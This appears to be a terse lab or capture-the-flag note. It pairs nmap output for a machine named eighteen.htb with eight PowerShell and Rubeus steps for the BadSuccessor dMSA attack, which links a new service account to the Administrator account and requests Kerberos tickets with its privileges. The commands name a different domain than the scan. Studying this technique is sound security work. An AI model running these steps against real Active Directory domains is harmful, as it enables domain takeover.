---
tags:
  - Windows
  - Active_Directory
  - BadSuccessor
---


```
80/tcp   open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RC0+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
```





**1. Create a Computer Account**
```powershell
New-ADComputer -Name BadMachine1234 `
    -SamAccountName "BadMachine1234$" `
    -AccountPassword (ConvertTo-SecureString -String "Passw0rd@123456" -AsPlainText -Force) `
    -Enabled $true `
    -Path "OU=BadOU,DC=talokan,DC=local" `
    -PassThru `
    -Server "talokan.local"

```

**2. Derive AES256 Hash using Rubeus**
```
Rubeus.exe hash /password:Passw0rd@123456 /user:BadMachine1234$ /domain:talokan.local
```

**3. Create the dMSA Account**
```
New-ADServiceAccount -Name BadDMSA1234 `
    -DNSHostName BadDMSA1234.talokan.local `
    -CreateDelegatedServiceAccount `
    -KerberosEncryptionType AES256 `
    -PrincipalsAllowedToRetrieveManagedPassword "BadMachine1234$" `
    -Path "OU=BadOU,DC=talokan,DC=local" `
	  -Verbose
```

**4. Grant `GenericAll` to Low Privileged User over the dMSA**
```
$sid = (Get-ADUser -Identity "namor").SID
$acl = Get-Acl "AD:\CN=BadDMSA1234,OU=BadOU,DC=talokan,DC=local"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=BadDMSA1234,OU=BadOU,DC=talokan,DC=local" -AclObject $acl -Verbose
```

**5. Set Delegation Attributes**
```
Set-ADServiceAccount -Identity BadDMSA1234 -Replace @{
    'msDS-ManagedAccountPrecededByLink' = 
	'CN=Administrator,CN=Users,DC=talokan,DC=local'
    'msDS-DelegatedMSAState' = 2
} -Verbose
```

**6. Verify dMSA Attributes**
```
Get-ADServiceAccount -Identity BadDMSA1234 -Properties msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState | Select-Object Name, msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState
```

**7. Request TGT with Machine Account**
```
Rubeus.exe asktgt /user:BadMachine1234$ /aes256:35A8AFC28FC81EECC2A2CEF24D5C198BAA0FCC0754C011BBDB9069A16A686097 /domain:talokan.local /nowrap
```

**8. Request TGS Using dMSA**
```
Rubeus.exe asktgs /targetuser:BadDMSA1234$ /service:krbtgt/talokan.local /dmsa /opsec /ptt /nowrap  /ticket:<ticket-from-last-step/machine-account-ticket>
```



